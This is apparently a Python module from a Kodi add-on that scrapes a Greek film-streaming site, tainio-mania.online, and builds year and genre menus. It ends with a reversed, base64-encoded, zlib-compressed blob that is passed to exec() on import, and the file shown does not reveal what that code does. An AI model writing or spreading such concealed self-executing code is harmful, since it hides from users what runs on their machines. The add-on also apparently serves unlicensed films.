# -*- coding: utf-8 -*-
import base64
from six import ensure_text
from six.moves.urllib_parse import parse_qs, urlencode
import xbmcgui
import xbmcaddon
import xbmc
import re
import requests
import six
from six.moves.urllib_parse import quote_plus
from resources.lib.modules import client
from resources.lib.modules import control
from resources.lib.modules import views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir
ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
TAINIOMANIA = 'https://tainio-mania.online/'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'
page= '[B][COLOR=lime]Επόμενη σελίδα >>[/COLOR][/B]'


def Tainiomania_menu(): #84
    addDir('[B][COLOR coral]2025[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2025-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2024[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2024-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2023[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2023-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έτος[/COLOR][/B]', '', 86, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κατηγορίες[/COLOR][/B]', '', 87, ART + 'tainiomania.png', FANART, '')

def menu_genre(): #87
    addDir('[B][COLOR coral]Ελλ-ταινίες[/COLOR][/B]', TAINIOMANIA + 'load/ellhnik_tain_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κωμωδίες[/COLOR][/B]', TAINIOMANIA + 'load/komodia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράμα[/COLOR][/B]', TAINIOMANIA + 'load/drama/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αισθηματικές[/COLOR][/B]', TAINIOMANIA + 'load/aisthhmatik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Οικογενειακές[/COLOR][/B]', 'load/oikogeneiak/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Χριστουγιεννιάτικες[/COLOR][/B]', TAINIOMANIA + 'collections/2-hristoygenniatikes-tainies-online', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μεταγλωτισμένα Παιδικά[/COLOR][/B]', TAINIOMANIA + 'load/metaglwtismena-paidika-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κινούμενα Σχέδια[/COLOR][/B]', TAINIOMANIA + 'load/kino_mena_sch_dia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Animation[/COLOR][/B]', TAINIOMANIA + 'xfsearch/genre/Animation/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράση[/COLOR][/B]', TAINIOMANIA + 'load/dr_sh/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έγκλημα[/COLOR][/B]', TAINIOMANIA + 'load/egkl_mato/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Περιπέτεια[/COLOR][/B]', TAINIOMANIA + 'load/perip_teia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Πολέμου[/COLOR][/B]', TAINIOMANIA + 'load/polemik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ιστορικές[/COLOR][/B]', TAINIOMANIA + 'load/istorik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Τρόμου[/COLOR][/B]', TAINIOMANIA + 'load/tr_moy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μυστήριο[/COLOR][/B]', TAINIOMANIA + 'load/mysthr_oy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θρίλερ[/COLOR][/B]', TAINIOMANIA + 'load/thr_ler/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Φαντασίας[/COLOR][/B]', TAINIOMANIA + 'load/fantas_a/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ντοκιμαντέρ[/COLOR][/B]', TAINIOMANIA + 'load/ntokimant_r/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Βιογραφίες[/COLOR][/B]', TAINIOMANIA + 'load/biograf_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μιούζικαλ[/COLOR][/B]', TAINIOMANIA + 'load/mio_zikal/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αθλητικά[/COLOR][/B]', TAINIOMANIA + 'load/athlhtik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θέατρο[/COLOR][/B]', TAINIOMANIA + 'load/th_atro/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μουσική[/COLOR][/B]', TAINIOMANIA + 'load/moysik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/seir/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ολοκληρωμένες Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/oloklhrwmenes_seires/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Γουέστερν[/COLOR][/B]', TAINIOMANIA + 'load/goy_stern_western/', 89, ART + 'tainiomania.png', FANART, '')


def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n',
                                                                                                               ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

